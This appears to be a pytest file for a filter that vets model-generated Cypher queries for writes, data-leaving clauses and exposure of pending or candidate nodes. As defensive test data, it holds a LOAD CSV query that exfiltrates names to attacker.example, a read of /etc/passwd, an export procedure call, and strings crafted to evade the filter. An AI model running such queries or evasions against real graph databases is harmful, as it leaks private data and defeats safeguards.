"""Tests for reject_write_cypher in agrag.cypher.safety.

Covers rejecting a write keyword anywhere in a query, including inside a
subquery CALL, in any letter case; rejecting a CALL to a procedure outside
the read-only allowlist. A cluster of adversarial-string tests
verifies the pre-filter's string/comment/backtick scanning is not
desynced by an escaped quote, a `//` or `/* */` comment, or a backtick
identifier placed between a keyword and a real write clause, and that a
write keyword used as a property name is still conservatively rejected.
"""

import pytest

from agrag.cypher.safety import (
    MissingIdentityGuardError,
    MissingPendingGuardError,
    UnsafeCypherError,
    find_candidate_exposure,
    reject_write_cypher,
    require_identity_guard,
    require_pending_guard,
)


class TestRejectWriteCypher:
    """reject_write_cypher raises on write keywords."""

    def test_rejects_unknown_procedure_call(self) -> None:
        """A CALL to a procedure outside the read-only allowlist is rejected."""
        with pytest.raises(UnsafeCypherError, match="disallowed procedure"):
            reject_write_cypher(
                "CALL apoc.export.csv.all('out.csv', {}) YIELD file RETURN file"
            )


class TestRejectDataLeavingClauses:
    """Clauses that read from, or switch to, somewhere else are rejected."""

    @pytest.mark.parametrize(
        "query",
        [
            "MATCH (n:Person) WITH collect(n.name) AS t "
            "LOAD CSV FROM 'https://attacker.example/?d=' + t[0] AS row RETURN row",
            "load csv from 'file:///etc/passwd' as row return row",
            "USE otherdb MATCH (n:Person) RETURN n",
            "SHOW CONSTRAINTS",
            "MATCH (n:Person) RETURN n UNION SHOW INDEXES",
        ],
    )
    def test_rejects_load_use_and_show(self, query: str) -> None:
        """LOAD CSV, USE and SHOW never pass the gate."""
        with pytest.raises(UnsafeCypherError):
            reject_write_cypher(query)

    def test_keywords_in_strings_and_comments_pass(self) -> None:
        """Only real tokens count."""
        reject_write_cypher("RETURN 'LOAD CSV and USE and SHOW'")
        reject_write_cypher("MATCH (n:Person) RETURN n // SHOW me")

    def test_rejects_call_in_subquery(self) -> None:
        """CALL inside a subquery is rejected."""
        with pytest.raises(UnsafeCypherError, match="CALL"):
            reject_write_cypher("MATCH (n) CALL { WITH n RETURN n } RETURN n")

    def test_rejects_lowercase_write_keyword(self) -> None:
        """Lowercase write keywords are not a bypass.

        Cypher keywords are case-insensitive; the pre-filter must
        catch ``delete`` written in any case so a model cannot
        sneak a write past it by lowering one letter.
        """
        with pytest.raises(UnsafeCypherError, match="DELETE"):
            reject_write_cypher("match (n) delete n")

    def test_escaped_quote_inside_literal_does_not_desync(self) -> None:
        r"""An escaped quote inside a literal does not leak a real DELETE.

        A literal like ``"b\" c "`` must not open a span that
        swallows the rest of the query, hiding a real write after it.
        """
        with pytest.raises(UnsafeCypherError, match="DELETE"):
            reject_write_cypher('RETURN "b\\" c " MATCH (n) DELETE n AND x = "y"')

    def test_keyword_inside_line_comment_does_not_trigger(self) -> None:
        """A write keyword in a ``//`` comment is correctly inert."""
        reject_write_cypher("MATCH (n) RETURN n // keep DELETE out")

    def test_keyword_inside_block_comment_does_not_trigger(self) -> None:
        """A write keyword in a ``/* */`` comment is correctly inert."""
        reject_write_cypher("MATCH (n) /* intent: DELETE */ RETURN n")

    def test_rejects_backtick_identifier_does_not_hide_write(self) -> None:
        """A backtick identifier between the keyword and the write is stripped.

        A backtick-delimited identifier in Cypher can contain quotes
        and other characters, so a naive quote-strip can desync. The
        scanner blanks backtick content first, so the write that
        follows is still caught.
        """
        with pytest.raises(UnsafeCypherError, match="DELETE"):
            reject_write_cypher("MATCH (n) RETURN n.`weird` DELETE n")

    def test_keyword_used_as_property_name_is_rejected(self) -> None:
        """Conservative: a write keyword as a property name is still rejected.

        The pre-filter is intentionally conservative because a model
        could have meant either a property access or a clause
        keyword; rejecting is the safe side for a pre-filter that
        guards model-generated text.
        """
        with pytest.raises(UnsafeCypherError, match="SET"):
            reject_write_cypher("MATCH (n) RETURN n.set")

    def test_call_keyword_is_case_insensitive(self) -> None:
        """Lowercase ``call`` is treated as a procedure call too."""
        reject_write_cypher(
            "call db.index.vector.queryNodes('idx', 10, $v) YIELD node RETURN node"
        )


_NODE = "n._pending_job_id IS NULL"


class TestRequirePendingGuard:
    """require_pending_guard demands a pending filter on every bound variable."""

    @pytest.mark.parametrize(
        "query",
        [
            f"MATCH (n:Person) WHERE {_NODE} RETURN count(n)",
            "MATCH (a:Person)-[r:KNOWS]->(b:Person) "
            "WHERE a._pending_job_id IS NULL AND b._pending_job_id IS NULL "
            "AND r._pending_job_id IS NULL RETURN a.name",
            "MATCH p = (a:Person)-[r:KNOWS*1..3]-(b) "
            "WHERE a._pending_job_id IS NULL AND b._pending_job_id IS NULL "
            "AND ALL(x IN nodes(p) WHERE x._pending_job_id IS NULL) "
            "AND ALL(y IN r WHERE y._pending_job_id IS NULL) RETURN b",
            "CALL db.index.vector.queryNodes('idx', 3, $v) YIELD node, score "
            "WHERE node._pending_job_id IS NULL RETURN node",
            "MATCH (n:Person) WHERE n._pending_job_id is null RETURN n",
            f"MATCH (n:Person) WHERE {_NODE} AND (n.a = 1 OR n.b = 2) RETURN n",
            f"MATCH (n:Person) WHERE (n.a = 1 OR n.b = 2) AND {_NODE} RETURN n",
            f"MATCH (n:Person) WHERE n.a = 1 OR n.b = 2 WITH n WHERE {_NODE} RETURN n",
            f"MATCH (n:Person) WHERE {_NODE} RETURN n ORDER BY n.name",
        ],
    )
    def test_accepts_guarded_queries(self, query: str) -> None:
        """A query that filters every variable passes."""
        require_pending_guard(query)

    @pytest.mark.parametrize(
        "query",
        [
            "MATCH (n:Person) RETURN n",
            f"MATCH (n:Person)-[:KNOWS]->(m) WHERE {_NODE} RETURN m",
            "MATCH ()-[r]->(m) WHERE m._pending_job_id IS NULL RETURN m",
            "MATCH (a)-->(b) WHERE a._pending_job_id IS NULL "
            "AND b._pending_job_id IS NULL RETURN b",
            "MATCH (a)-[r*1..2]-(b) WHERE a._pending_job_id IS NULL "
            "AND b._pending_job_id IS NULL RETURN b",
            "CALL db.index.vector.queryNodes('idx', 3, $v) YIELD node, score "
            "RETURN node",
            "MATCH (n:Person) WHERE n.note = 'n._pending_job_id IS NULL' RETURN n",
            "MATCH (n:Person) WHERE NOT n._pending_job_id IS NULL RETURN n",
            "MATCH (n:Person) WHERE NOT (n._pending_job_id IS NULL) RETURN n",
            "MATCH (n:Person) RETURN n, n._pending_job_id IS NULL AS visible",
            "MATCH (n:Person) RETURN n ORDER BY n._pending_job_id IS NULL",
            f"MATCH (n:Person) WHERE {_NODE} OR true RETURN n",
            f"MATCH (n:Person) WHERE true OR {_NODE} RETURN n",
            f"MATCH (n:Person) WHERE n.a = 1 OR n.b = 2 AND {_NODE} RETURN n",
            f"MATCH (n:Person) WHERE ({_NODE}) OR n.a = 1 RETURN n",
            f"MATCH (n:Person) WHERE ({_NODE} AND n.a = 1) OR n.b = 2 RETURN n",
            f"MATCH (n:Person) WHERE {_NODE} RETURN n UNION MATCH (m:Person) RETURN m",
        ],
    )
    def test_rejects_queries_that_can_return_pending_rows(self, query: str) -> None:
        """A missing, unnamed or only-quoted guard is rejected."""
        with pytest.raises(MissingPendingGuardError):
            require_pending_guard(query)


class TestRequireIdentityGuard:
    """require_identity_guard blocks queries that can reach candidates."""

    @pytest.mark.parametrize(
        "query",
        [
            "MATCH (n:Person) RETURN n",
            "MATCH (n) WHERE n:Person AND n._pending_job_id IS NULL RETURN n",
            "MATCH (n:Person)-[r:KNOWS*1..3]-(m:Person) RETURN m",
            "MATCH p = (n:Person)-[r*1..2]-(m:Person) "
            "WHERE ALL(x IN nodes(p) WHERE x:Person) RETURN m",
            "RETURN 1",
        ],
    )
    def test_accepts_queries_constrained_to_the_entity_graph(self, query: str) -> None:
        """A non-candidate label or complete path guard prevents exposure."""
        require_identity_guard(query)
        assert find_candidate_exposure(query) is None

    @pytest.mark.parametrize(
        "query",
        [
            "MATCH (n) RETURN n",
            "MATCH (n:Candidate) RETURN n",
            "MATCH (n) WHERE NOT n:Chunk RETURN n",
            "MATCH (n) WHERE NOT (n:Person) RETURN n",
            "MATCH (n) RETURN n, n:Person AS is_person",
            "MATCH p = (a:Person)-[r*1..3]-(b:Person) "
            "WHERE NOT (ALL(x IN nodes(p) WHERE x:Person)) RETURN p",
            "MATCH p = (a:Person)-[r*1..3]-(b:Person) "
            "RETURN p, ALL(x IN nodes(p) WHERE x:Person)",
            "MATCH (n) WHERE n:Person OR n:Org RETURN n",
            "MATCH (a:Person)-[:EVIDENCED_BY*1..3]-(b:Person) RETURN b",
        ],
    )
    def test_rejects_queries_that_can_reach_a_candidate(self, query: str) -> None:
        """An open node, candidate label or candidate edge path is rejected."""
        with pytest.raises(MissingIdentityGuardError):
            require_identity_guard(query)

    @staticmethod
    def test_label_text_in_string_does_not_guard_an_unlabelled_node() -> None:
        """A string literal cannot constrain the matched node label."""
        query = "MATCH (n) WHERE n.note = 'n:Person' RETURN n"

        reason = find_candidate_exposure(query)

        assert reason is not None
        with pytest.raises(MissingIdentityGuardError):
            require_identity_guard(query)

    @staticmethod
    @pytest.mark.parametrize(
        "query",
        [
            # A pattern comprehension after RETURN binds an unlabelled node.
            "MATCH (n:Person) RETURN [(n)-->(m) | m] AS x",
            # A later UNION branch reuses a name whose label test is elsewhere.
            "MATCH (n) WHERE n:Person RETURN n UNION MATCH (n) RETURN n",
            # A quantified relationship can repeat through an unlabelled node.
            "MATCH (a:Person)-[r]-{1,2}(b:Person) RETURN a",
            # A path guard on a different path variable does not guard this path.
            "MATCH p = (a:Person)-[*1..3]-(b:Person) "
            "WHERE ALL(x IN nodes(q) WHERE x:Person) RETURN p",
            # WITH can rebind a labelled name to an unlabelled node.
            "MATCH (a:Person) WITH a MATCH (a) RETURN a",
            # A variable-length path whose nodes are guarded only after WITH.
            "MATCH (a:Person) WITH a MATCH p = (a)-[*1..3]-(b:Person) "
            "WHERE ALL(x IN nodes(p) WHERE x:Person) RETURN b",
        ],
    )
    def test_rejects_bypasses_of_the_identity_guard(query: str) -> None:
        """Each construct the text check could not follow is rejected."""
        assert find_candidate_exposure(query) is not None
        with pytest.raises(MissingIdentityGuardError):
            require_identity_guard(query)
